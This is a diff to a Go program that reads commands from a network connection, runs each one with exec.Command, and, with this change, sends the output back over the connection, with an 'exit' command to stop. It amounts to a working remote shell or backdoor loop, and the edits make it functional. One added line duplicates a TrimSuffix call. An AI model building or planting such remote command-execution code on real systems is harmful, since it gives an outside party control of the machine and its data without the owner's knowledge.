@@ -29,9 +29,15 @@ func main() {
 	for {
 		//dec := gob.NewDecoder(conn)
 		//dec.Decode()
-
 		cmd, _ := bufio.NewReader(conn).ReadString('\n')
 		cmd = strings.TrimSuffix(cmd, "\n")
+		cmd = strings.TrimSuffix(cmd, "\n")
+
+		if (cmd == "exit") {
+			break
+		}
+
+		fmt.Println(cmd)
 		out, err := exec.Command(cmd).Output()
 		
 		if err != nil {
@@ -41,6 +47,7 @@ func main() {
 		fmt.Println("Command Successfully Executed")
 		output := string(out[:])
 		fmt.Println(output)
+		fmt.Fprintf(conn, output)
 
 		/*
 		if runtime.GOOS == "windows" {
@@ -54,8 +61,8 @@ func main() {
 			log.Fatalf("cmd.Run() failed with %s\n", err)
 		}
 		*/
-		
-		conn.Close()
+
 		fmt.Println("Finished")
 	}
+	conn.Close()
 }
